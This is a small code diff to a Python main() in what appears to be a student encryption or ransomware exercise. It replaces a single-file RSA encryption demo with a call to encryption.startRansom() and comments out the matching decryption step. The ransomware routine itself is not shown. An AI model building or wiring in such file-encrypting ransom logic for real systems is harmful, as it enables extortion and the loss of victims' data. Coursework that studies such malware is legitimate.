@@ -9,11 +9,9 @@ def main():
 	# Creates random 32 bytes
 	encKey = os.urandom(constants.CONST_KEY_BYTES)
 	hmacKey = os.urandom(constants.CONST_HMACKEY_BYTES)
-
-	#rsakeys.createKeyPair(os.getcwd())
-	(RSACipher, cipherFile, iv, tag, fileExt) = encryption.myRSAEncrypt("hello.txt","public_key")
+	encryption.startRansom()
 	pause = input("Enter when finished")
-	decryption.myRSADecrypt(RSACipher,"hello.txt",iv,tag,fileExt,"private_key")
+	#decryption.myRSADecrypt(RSACipher,"hello.txt",iv,tag,fileExt,privateKeyPath)
 	message = b"This is a secret message. ATTACK AT DAWN FROM THE NORTH."
 	print("Original Message: ", message,"\n")
 	
